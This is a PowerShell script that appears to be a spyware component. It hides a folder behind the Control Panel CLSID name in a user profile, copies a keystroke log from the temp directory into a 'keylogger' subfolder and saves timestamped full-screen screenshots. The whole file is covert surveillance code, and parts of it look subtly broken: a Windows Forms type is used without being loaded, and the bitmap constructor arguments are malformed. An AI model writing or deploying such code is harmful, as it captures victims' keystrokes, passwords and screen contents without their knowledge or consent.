# Define root directory and GUID folder
$rdir = "C:\Users\hai1723"
$guidFolder = "{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$dir = Join-Path -Path $rdir -ChildPath $guidFolder

# Define the base path for the general folder
$basePath = Join-Path -Path $dir -ChildPath "generalfolder"

# List of directories to create
$directories = "keylogger", "screenshot"

# Ensure the GUID folder exists
if (-not (Test-Path -Path $dir)) {
    New-Item -Path $dir -ItemType Directory
    Write-Output "Created directory: $dir"
} else {
    Write-Output "Directory already exists: $dir"
}

# Ensure the base path exists
if (-not (Test-Path -Path $basePath)) {
    New-Item -Path $basePath -ItemType Directory
    Write-Output "Created directory: $basePath"
} else {
    Write-Output "Directory already exists: $basePath"
}

# Create each directory under the general folder
foreach ($dirName in $directories) {
    $fullPath = Join-Path -Path $basePath -ChildPath $dirName
    if (-not (Test-Path -Path $fullPath)) {
        New-Item -Path $fullPath -ItemType Directory
        Write-Output "Created directory: $fullPath"
    } else {
        Write-Output "Directory already exists: $fullPath"
    }
}

$LogFile = "$env:TEMP\Log.tmp"
$currentDateTime = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$KeyLogFile = "$dir\keylogger\$currentDateTime.txt"
Copy-Item -Path $LogFile -Destination $KeyLogFile -Force

# Define the path and filename for the screenshot
$screenshotPath = "$dir\screenshot\$currentDateTime.png"

# Create a new bitmap object for the screenshot
Add-Type -AssemblyName System.Drawing

# Capture the screen
$bitmap = New-Object System.Drawing.Bitmap -ArgumentList [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)

# Save the screenshot to the specified path
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)

# Clean up
$graphics.Dispose()
$bitmap.Dispose()

# Output the path of the saved screenshot
Write-Output "Screenshot saved to: $screenshotPath"
